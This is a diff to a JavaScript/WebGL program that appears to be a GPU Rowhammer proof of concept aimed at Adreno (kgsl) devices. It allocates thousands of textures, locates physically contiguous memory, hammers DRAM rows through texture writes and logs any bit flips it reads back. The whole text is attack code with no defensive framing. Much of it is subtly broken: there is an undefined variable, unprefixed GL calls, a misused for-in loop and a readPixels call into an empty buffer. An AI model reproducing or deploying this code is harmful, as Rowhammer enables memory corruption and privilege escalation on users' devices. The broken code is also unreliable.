@@ -386,127 +386,133 @@ async function main() {
     var zerotexdata = []; // data has to be not null. could be on demand allocation
     for(var i = 0; i < 32; ++i) for(var j  = 0; j < 32; ++j) for(var bt = 0; bt < 4; ++bt) zerotexdata.push(0x0)
     zerotexdata = new Uint8Array(zerotexdata);
-
-	for (var i = 0; i < 20000; ++i){
-		texs.push(gl.createTexture())
-		gl.bindTexture(gl.TEXTURE_2D, texs[i]);
-		var level = 0;
-        var internalFormat = gl.RGBA;
-        var border = 0;
-        var format = gl.RGBA;
-        var type = gl.UNSIGNED_BYTE;
-       
-        gl.texImage2D(gl.TEXTURE_2D, level, internalFormat,
-                        32, 32, border,
-                        format, type, texdata);
- 
-		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
-		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
-		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
-        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
-        // gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 1, 0, format, type, new Uint8Array([0xffffffff,0xffffffff,0xffffffff]));
-	}
-
-    // Since all textures are really allocated in DRAM, now it's time to identify contigious chunks of memory
-
-    var FBF = gl.createFramebuffer();
-    var kgsl = {}
     get_tex_data().then(function(data){
-        /* Example of kgsl entry
-        * {
-        * pfn: 28576
-        * tex_id: 112
-        * tex_size: 1114112
-        * v_addr: 2237923328
-        * }
-        */
-        kgsl = data; 
-        kgsl = kgsl.sort(function(a, b){return a.pfn > b.pfn}); // asc order by pfns
-        var kgslmap = []
-        var counter = 1;
-        for(var i = 1; i < kgsl.length; ++i){
-            // console.log("DIFF : " + (kgsl[i].pfn - kgsl[i - 1].pfn));
-            if(kgsl[i].pfn - kgsl[i - 1].pfn == 1){
-                ++counter;
-                if(counter == 64){
-                    counter = 1;
-                    kgslmap.push(i - 64);
-                }
-            } else {
-                counter = 1;
-            } 
+        var old_kgsl = data;
+        for (var i = 0; i < 20000; ++i){
+            texs.push(gl.createTexture())
+            gl.bindTexture(gl.TEXTURE_2D, texs[i]);
+            var level = 0;
+            var internalFormat = gl.RGBA;
+            var border = 0;
+            var format = gl.RGBA;
+            var type = gl.UNSIGNED_BYTE;
+           
+            gl.texImage2D(gl.TEXTURE_2D, level, internalFormat,
+                            32, 32, border,
+                            format, type, texdata);
+     
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+            // gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 1, 0, format, type, new Uint8Array([0xffffffff,0xffffffff,0xffffffff]));
         }
-        console.log("Detected <" + kgslmap.length + "> contigious chunks...");
-        console.log("HAMMERING MATHAFAKA...");
-        for(var i = 0; i < kgslmap.length; ++i){
-            for(var k = 0; k < 28; ++k){
-                gl.useProgram(prog);
-                console.log("Hammering [" + i +" : " + k + "]");
-                // HAMMERED ROW
-                for(var j = 0 ; j < 4; ++j){
-                    gl.bindTexture(gl.TEXTURE_2D, kgsl[kgslmap[i] + k + 16 + j].tex_id);
-                    gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, texdata);
-                }
+    
+        // Since all textures are really allocated in DRAM, now it's time to identify contigious chunks of memory
+    
+        var FBF = gl.createFramebuffer();
+        var kgsl = {}
+        get_tex_data().then(function(data){
+            /* Example of kgsl entry
+            * {
+            * pfn: 28576
+            * tex_id: 112
+            * tex_size: 1114112
+            * v_addr: 2237923328
+            * }
+            */
+            kgsl = data; 
+            kgsl = kgsl.sort(function(a, b){return a.pfn > b.pfn}); // asc order by pfns
+            var startID = 0xffffffffffff;
 
-                // IDLE ROWS
-                var evictionTexLocation = gl.getUniformLocation(prog, "row1");
-                glUniform1i(evictionTexLocation, 0);
-                glActiveTexture(gl.TEXTURE0); // eviction Texture Unit
-                glBindTexture(gl.TEXTURE_2D, kgsl[kgslmap[i] + k].tex_id);
-                glTexSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
-                
-                var evictionTexLocation2 = gl.getUniformLocation(prog, "row2");
-                glUniform1i(evictionTexLocation, 1);
-                glActiveTexture(gl.TEXTURE0 + 1); // eviction Texture Unit
-                glBindTexture(gl.TEXTURE_2D, kgsl[kgslmap[i] + k + 32].tex_id);
-                glTexSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
-                
-                for(var j = 0 ; j < 4; ++j){
-                    var evictLoc = gl.getUniformLocation(prog, "evict[" + j + "]");
+            for(var ent in kgsl){if(startID > ent.tex_id) startID = ent.tex_id;}
+            var kgslmap = []
+            var counter = 1;
+            for(var i = 1; i < kgsl.length; ++i){
+                // console.log("DIFF : " + (kgsl[i].pfn - kgsl[i - 1].pfn));
+                if(kgsl[i].pfn - kgsl[i - 1].pfn == 1){
+                    ++counter;
+                    if(counter == 64){
+                        counter = 1;
+                        kgslmap.push(i - 64);
+                    }
+                } else {
+                    counter = 1;
+                } 
+            }
+            console.log("Detected <" + kgslmap.length + "> contigious chunks...");
+            console.log("HAMMERING MATHAFAKA...");
+            for(var i = 0; i < kgslmap.length; ++i){
+                for(var k = 0; k < 28; ++k){
+                    gl.useProgram(prog);
+                    console.log("Hammering [" + i +" : " + k + "]");
+                    // HAMMERED ROW
+                    for(var j = 0 ; j < 4; ++j){
+                        gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 16 + j].tex_id - startID]);
+                        gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, texdata);
+                    }
+    
+                    // IDLE ROWS
+                    var evictionTexLocation = gl.getUniformLocation(prog, "row1");
                     glUniform1i(evictionTexLocation, 0);
-                    glActiveTexture(gl.TEXTURE0 + 2 + j); // eviction Texture Unit
-                    glBindTexture(gl.TEXTURE_2D, kgsl[kgslmap[i] + k + 1 + j].tex_id);
+                    glActiveTexture(gl.TEXTURE0); // eviction Texture Unit
+                    glBindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k].tex_id - startID]);
                     glTexSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
-                }
-
-                for(var j = 0 ; j < 4; ++j){
-                    var evictLoc = gl.getUniformLocation(prog, "evict[" + 4 + j + "]");
+                    
+                    var evictionTexLocation2 = gl.getUniformLocation(prog, "row2");
+                    glUniform1i(evictionTexLocation, 1);
+                    glActiveTexture(gl.TEXTURE0 + 1); // eviction Texture Unit
+                    glBindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 32].tex_id - startID]);
+                    glTexSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
+                    
+                    for(var j = 0 ; j < 4; ++j){
+                        var evictLoc = gl.getUniformLocation(prog, "evict[" + j + "]");
+                        glUniform1i(evictionTexLocation, 0);
+                        glActiveTexture(gl.TEXTURE0 + 2 + j); // eviction Texture Unit
+                        glBindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 1 + j].tex_id - startID]);
+                        glTexSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
+                    }
+    
+                    for(var j = 0 ; j < 4; ++j){
+                        var evictLoc = gl.getUniformLocation(prog, "evict[" + 4 + j + "]");
+                        glUniform1i(evictionTexLocation, 0);
+                        glActiveTexture(gl.TEXTURE0 + 6 + j); // eviction Texture Unit
+                        glBindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 33 + j].tex_id - startID]);
+                        glTexSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
+                    }
+    
+                    var evictLoc = gl.getUniformLocation(prog, "evict[8]");
                     glUniform1i(evictionTexLocation, 0);
-                    glActiveTexture(gl.TEXTURE0 + 6 + j); // eviction Texture Unit
-                    glBindTexture(gl.TEXTURE_2D, kgsl[kgslmap[i] + k + 33 + j].tex_id);
+                    glActiveTexture(gl.TEXTURE0 + 10); // eviction Texture Unit
+                    glBindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 5].tex_id - startID]);
                     glTexSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
-                }
-
-                var evictLoc = gl.getUniformLocation(prog, "evict[8]");
-                glUniform1i(evictionTexLocation, 0);
-                glActiveTexture(gl.TEXTURE0 + 10); // eviction Texture Unit
-                glBindTexture(gl.TEXTURE_2D, kgsl[kgslmap[i] + k + 5].tex_id);
-                glTexSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
-        
-                gl.clearColor(1, 0, 1, 1);
-                gl.clear(gl.COLOR_BUFFER_BIT);
-                console.log("RUNNING ...")
-                gl.drawArrays(gl.TRIANGLES, 0, 3);
-                console.log("EXECUTED ..")
-                gl.bindFramebuffer(gl.FRAMEBUFFER, FBF);
-                for(var j = 0 ; j < 4; ++j){
-                    // kgsl[kgslmap[i] + k + 16 + j].tex_id
-                    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, kgsl[kgslmap[i] + k + 16 + j].tex_id, 0);
-                    frame = new Uint8Array([]);
-                    gl.readPixels(0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, frame);
-                    for(var it = 0; it < 32 * 32 * 4; ++it)
-                        if(frame[it] != 0xff){
-                            hexString = yourNumber.toString(16);
-                            if (hexString.length % 2) {hexString = '0' + hexString;}
-                            console.log("BITFLIP FROM 0xff to 0x" + hexString)
-                        }
+            
+                    gl.clearColor(1, 0, 1, 1);
+                    gl.clear(gl.COLOR_BUFFER_BIT);
+                    console.log("RUNNING ...")
+                    gl.drawArrays(gl.TRIANGLES, 0, 3);
+                    console.log("EXECUTED ..")
+                    gl.bindFramebuffer(gl.FRAMEBUFFER, FBF);
+                    for(var j = 0 ; j < 4; ++j){
+                        // kgsl[kgslmap[i] + k + 16 + j].tex_id
+                        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 16 + j].tex_id - startID], 0);
+                        frame = new Uint8Array([]);
+                        gl.readPixels(0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, frame);
+                        for(var it = 0; it < 32 * 32 * 4; ++it)
+                            if(frame[it] != 0xff){
+                                hexString = yourNumber.toString(16);
+                                if (hexString.length % 2) {hexString = '0' + hexString;}
+                                console.log("BITFLIP FROM 0xff to 0x" + hexString)
+                            }
+                    }
                 }
             }
-        }
-    
-      
         
-    })
+          
+            
+        })
     
+    })
+	    
 }
 
